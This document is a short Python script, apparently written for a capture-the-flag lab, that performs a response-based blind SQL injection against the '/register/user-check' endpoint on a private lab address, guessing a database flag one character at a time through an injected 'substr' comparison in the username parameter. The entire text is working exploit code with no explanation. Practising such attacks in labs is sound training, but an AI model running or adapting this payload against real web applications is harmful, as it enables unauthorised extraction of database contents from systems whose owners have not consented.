#MarCorei7 Script SQLi-blind Response based

import requests
import string

url = "http://10.10.89.153"

flag = ""
counter = 1

chars = "{" + "}" + ":"
chars += string.ascii_letters
chars += string.digits

while True:
	for i in chars:
		payload = f"/register/user-check?username=admin' and (substr((SELECT flag FROM flag LIMIT 0,1),{counter},1)) = '{i}';-- -"
		r = requests.get(url + payload)
		if 'false' in r.text:
			flag += i
			counter += 1
			print(flag)
			break
